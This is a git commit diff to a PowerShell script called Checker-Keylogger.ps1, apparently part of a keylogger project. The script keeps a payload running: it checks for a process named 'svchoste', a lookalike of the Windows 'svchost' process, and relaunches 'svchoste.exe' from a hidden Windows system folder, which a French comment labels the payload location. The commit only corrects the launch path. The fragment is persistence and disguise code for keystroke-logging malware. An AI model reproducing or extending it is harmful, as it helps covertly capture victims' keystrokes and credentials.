8c2d1705766cf45a85fbc228df07c2608a371668
Hilan Meyran <67104154+ShawnHeyli@users.noreply.github.com>
2021-06-28 09:58:44 +0200

    Update Checker-Keylogger.ps1

--- Checker-Keylogger.ps1
+++ Checker-Keylogger.ps1
@@ -2,5 +2,5 @@ $FolderPath = "C:\Windows\PLA\Exceptions\" #Emplacement du payload
 $FileName = "svchoste.exe" #Nom du fichier
 
 if(!(Get-Process "svchoste" -ErrorAction SilentlyContinue)){
-     & .\$FolderPath$FileName
+     & $FolderPath$FileName
 }
